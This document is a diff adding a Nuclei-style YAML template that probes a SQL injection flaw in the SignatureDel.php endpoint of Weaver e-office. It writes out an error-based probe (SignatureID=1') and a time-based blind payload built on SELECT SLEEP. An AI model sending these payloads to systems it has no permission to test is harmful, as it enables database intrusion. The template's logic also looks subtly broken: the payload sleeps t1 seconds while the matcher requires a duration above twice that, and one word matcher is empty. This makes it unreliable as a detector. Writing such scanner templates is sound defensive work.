@@ -1,0 +1,51 @@
+id: poc-yaml-weaver-e-office-signaturedel-php-sqli
+info:
+  name: 泛微OA e-office SignatureDel.php SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL Injection vulnerability in 泛微OA e-office SignatureDel.php endpoint.
+http:
+  - raw:
+      - |
+        GET /iWebOffice/Signature/SignatureDel.php?SignatureID=1' HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "valid MySQL"
+          - "SignatureDel.php"
+
+  - raw:
+      - |
+        GET /iWebOffice/Signature/SignatureDel.php?SignatureID=1+AND+(SELECT+7431+FROM+(SELECT(SLEEP({{t1}})))LtXU) HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: body
+        words:
+          - ""
+      - type: word
+        part: header
+        words:
+          - "LOGIN_LANG="
+      - type: dsl
+        dsl:
+          - "duration > {{t2}} && duration < {{t3}}"
+
+variables:
+  t1: "{{rand_int(2,5)}}"
+  t2: "{{to_number(t1)*2}}"
+  t3: "{{to_number(t2)+2}}"
